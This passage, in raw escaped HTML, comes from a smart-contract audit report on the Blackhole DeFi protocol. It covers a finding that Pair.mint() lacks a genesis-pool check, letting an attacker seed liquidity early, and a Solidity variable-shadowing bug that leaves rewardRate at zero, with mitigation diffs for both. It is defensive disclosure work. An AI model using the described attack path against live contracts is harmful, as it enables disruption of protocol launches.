\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;ILM\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Pair: INSUFFICIENT_LIQUIDITY_MINTED\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_mint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_update\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balance0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balance1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_reserve0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_reserve1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eMint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amount0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amount1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ePair.sol::mint()\u003c/code\u003e does not have any \u003ccode\u003eisGenesis\u003c/code\u003e status check.\u003c/li\u003e\n\u003cli\u003eAn attacker can transfer minimal \u003ccode\u003etoken0\u003c/code\u003e and \u003ccode\u003etoken1\u003c/code\u003e to a Genesis pair (where \u003ccode\u003eisGenesis == true\u003c/code\u003e and \u003ccode\u003etotalSupply == 0\u003c/code\u003e) and call \u003ccode\u003emint()\u003c/code\u003e directly.\u003c/li\u003e\n\u003cli\u003eThis mints LP tokens, makes \u003ccode\u003etotalSupply \u003e 0\u003c/code\u003e, and bypasses the (already weak) \u003ccode\u003eRouterV2.addLiquidity\u003c/code\u003e guard for that pair.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"impact-6\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-6\" aria-label=\"impact 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eThe impact isn’t a direct loss of deposited funds but is a significant disruption to a core protocol mechanism, potentially leading to unfair advantages, poor launch conditions for projects, and reduced trust. This fits a Medium severity: ”\u003cem\u003eAssets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions\u003c/em\u003e“.\u003c/p\u003e\n\u003cp\u003eThis is also clearly against this statement in \u003ccode\u003econtract diff / Liquidity Pool / PairFactory\u003c/code\u003e:\n”\u003cem\u003eWhen a pair gets listed as Genesis Pool until it’s not successfully launched noone should be able to add liquidity so we’re using this \u003ccode\u003eisGenesis\u003c/code\u003e flag to control add liquidity flow\u003c/em\u003e”\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eIn \u003ccode\u003eRouterV2.addLiquidity\u003c/code\u003e block if the pair is a Genesis Pool, regardless of \u003ccode\u003etotalSupply\u003c/code\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"35\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e- require(!(IBaseV1Factory(factory).isGenesis(pair) \u0026amp;\u0026amp; IBaseV1Pair(pair).totalSupply() == 0), \u0026quot;NA\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+ require(!IBaseV1Factory(factory).isGenesis(pair), \u0026quot;GENESIS_POOL_LIQUIDITY_LOCKED\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eRestrict \u003ccode\u003ePair.mint()\u003c/code\u003e for genesis pairs by adding a check in \u003ccode\u003ePair.sol::mint()\u003c/code\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"36\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003efunction mint(address to) external lock returns (uint liquidity) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   require(!PairFactory(factory).isGenesis(address(this)), \u0026quot;GENESIS_POOL_MINT_LOCKED\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    // ... existing mint logic ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-46\"\u003erayss\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-39\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-08-function-return-variable-shadowing-prevents-storage-updates-in-solidity\" style=\"position:relative;\"\u003e\u003ca href=\"#m-08-function-return-variable-shadowing-prevents-storage-updates-in-solidity\" aria-label=\"m 08 function return variable shadowing prevents storage updates in solidity permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-133\"\u003e[M-08] Function return variable shadowing prevents storage updates in solidity\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-324\"\u003ea39955720\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-480\"\u003eEkene\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeCL.sol#L38\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeCL.sol#L38\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeCL.sol#L157-L183\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeCL.sol#L157-L183\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeCL.sol#L257-L259\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeCL.sol#L257-L259\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-6\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-6\" aria-label=\"finding description 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eGaugeCL::notifyRewardAmount\u003c/code\u003e function attempts to update the \u003ccode\u003erewardRate\u003c/code\u003e state variable, which is meant to track the reward emission rate for the current distribution period. However, the function declares a return variable named \u003ccode\u003erewardRate\u003c/code\u003e (as part of the function’s return signature), which \u003cstrong\u003eshadows\u003c/strong\u003e the contract-level storage variable. As a result, assignments within the function update only the local return variable, and the \u003cstrong\u003econtract’s storage \u003ccode\u003erewardRate\u003c/code\u003e is never updated\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eThis leads to the reward rate always remaining at its initial value (\u003ccode\u003e0\u003c/code\u003e), and any queries to \u003ccode\u003erewardForDuration()\u003c/code\u003e or other on-chain users referencing \u003ccode\u003erewardRate\u003c/code\u003e will receive inaccurate results.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// @audit-issue Storage rewardRate is shadowed and never updated\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enotifyRewardAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enonReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisNotEmergency\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyDistribution\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIncentiveKey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentivekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusRewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e{\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_periodFinish\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDURATION\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eremaining\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_periodFinish\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eleftover\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eremaining\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eleftover\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDURATION\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"issue-identified\" style=\"position:relative;\"\u003e\u003ca href=\"#issue-identified\" aria-label=\"issue identified permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eIssue identified\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eThe function’s return signature declares a local variable \u003ccode\u003erewardRate\u003c/code\u003e, which \u003cstrong\u003eshadows\u003c/strong\u003e the contract’s storage variable of the same name.\u003c/li\u003e\n\u003cli\u003eAll assignments to \u003ccode\u003erewardRate\u003c/code\u003e within the function only affect this local variable, not the contract storage.\u003c/li\u003e\n\u003cli\u003eThe contract storage variable \u003ccode\u003erewardRate\u003c/code\u003e remains \u003cstrong\u003epermanently zero\u003c/strong\u003e, and is never updated by any function in the contract.\u003c/li\u003e\n\u003cli\u003eConsequently, the function \u003ccode\u003erewardForDuration()\u003c/code\u003e always returns \u003ccode\u003e0\u003c/code\u003e, misleading dApps, explorers, and UIs that rely on this state variable for reward calculations.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"risk-and-impact\" style=\"position:relative;\"\u003e\u003ca href=\"#risk-and-impact\" aria-label=\"risk and impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRisk and impact\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eLikelihood\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThis is a deterministic bug and will always occur if the function signature is not fixed.\u003c/li\u003e\n\u003cli\u003eAny user or protocol that queries \u003ccode\u003erewardForDuration()\u003c/code\u003e or the public \u003ccode\u003erewardRate\u003c/code\u003e will receive incorrect values.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eImpact\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eProtocol dashboards, explorers, or analytic scripts may display incorrect or misleading reward information.\u003c/li\u003e\n\u003cli\u003eThird-party tools or automated scripts that rely on on-chain \u003ccode\u003erewardRate\u003c/code\u003e data could behave incorrectly.\u003c/li\u003e\n\u003cli\u003eDoes \u003cstrong\u003enot\u003c/strong\u003e directly cause loss of funds or user assets, but can lead to confusion or improper reward tracking.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eRename the function return variable to avoid shadowing, or directly assign to the storage variable inside the function:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"38\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003efunction notifyRewardAmount(address token, uint256 reward)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    external\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    nonReentrant\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    isNotEmergency\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    onlyDistribution\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e-   returns (IncentiveKey memory incentivekey, uint256 rewardRate, uint128 bonusRewardRate)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   returns (IncentiveKey memory, uint256, uint128)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e{\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    require(token == address(rewardToken), \u0026quot;not rew token\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan 